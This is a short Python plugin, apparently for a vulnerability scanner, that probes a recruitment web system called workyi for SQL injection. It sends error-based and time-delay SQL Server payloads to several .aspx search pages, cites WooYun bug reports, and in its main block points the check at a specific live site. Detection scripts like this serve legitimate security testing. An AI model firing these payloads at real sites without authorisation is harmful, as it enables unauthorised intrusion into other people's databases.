#!/usr/bin/python
#-*- encoding:utf-8 -*-
#title:workyi_Talent system SQL injection
#author: xx00
#ref: http://www.wooyun.org/bugs/wooyun-2010-0120283
#ref: http://www.wooyun.org/bugs/wooyun-2010-0116472
#ref: http://www.wooyun.org/bugs/wooyun-2010-0115157
#ref: http://www.wooyun.org/bugs/wooyun-2010-0115094
def assign(service, arg):
    if service == "workyi_system":
        return True, arg


def audit(arg):
    #sql injection 1
    # url = arg + 'map/showtag.aspx'
    # postdata = "cenx=&ceny=&cenz=&maxX=&maxY=&minX=-1);%20waitfor%20delay%20'0:0:0'%20--%20&minY=&select1=%e4%bc%81%e4%b8%9a%e5%90%8d&select2=%e5%8c%97%e4%ba%ac&txtJingYan=&txtKey=1&txtLeiXing=&txtXueLi=&txtYueXin="
    # code, head, res, errcode, _ = curl.curl2(url,post=postdata)
    # if code == 200 and 'select' in res:
    #     security_warning('workyi_system sql injection:http://www.wooyun.org/bugs/wooyun-2010-0120283 %s'%url)

    #sql injection 2
    url = arg + "persondh/urgent.aspx?key=%27%20and%20@@version=0;--"
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 500 and 'SQL Server' in res:
        security_warning('workyi_system sql injection:http://www.wooyun.org/bugs/wooyun-2010-0116472 %s'%url)


    #sql injection 3
    sql_injection_3=0

    url = arg + "companydh/latest.aspx?key=%27%20and%20@@version=0%20or%20%27%%27=%27%"
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 500 and 'SQL Server' in res:
        sql_injection_3=1
    url = arg + "companydh/vip.aspx?key=%27%20and%20@@version=0%20or%20%27%%27=%27%"
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 500 and 'SQL Server' in res:
        sql_injection_3=1
    url = arg + "companydh/recommand.aspx?key=%27%20and%20@@version=0%20or%20%27%%27=%27%"
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 500 and 'SQL Server' in res:
        sql_injection_3=1
    url = arg + "companydh/picture.aspx?key=%27%20and%20@@version=0%20or%20%27%%27=%27"
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 500 and 'SQL Server' in res:
        sql_injection_3=1
    url = arg + "companydh/parttime.aspx?key=%27%20and%20@@version=0%20or%20%27%%27=%27%"
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 500 and 'SQL Server' in res:
        sql_injection_3=1
    if sql_injection_3==1:
        security_warning('workyi_system sql injection:http://www.wooyun.org/bugs/wooyun-2010-0115157 %s'%url)


    #sql injection 4
    url = arg + "news/search.aspx?key=%27%20and%20@@version=0%20or%20%27%%27=%27%"
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 500 and 'SQL Server' in res:
        security_warning('workyi_system sql injection:http://www.wooyun.org/bugs/wooyun-2010-0115094 %s'%url)




if __name__ == '__main__':
    from dummy import *
    audit(assign('workyi_system', 'http://www.tjkyhr.com/')[1])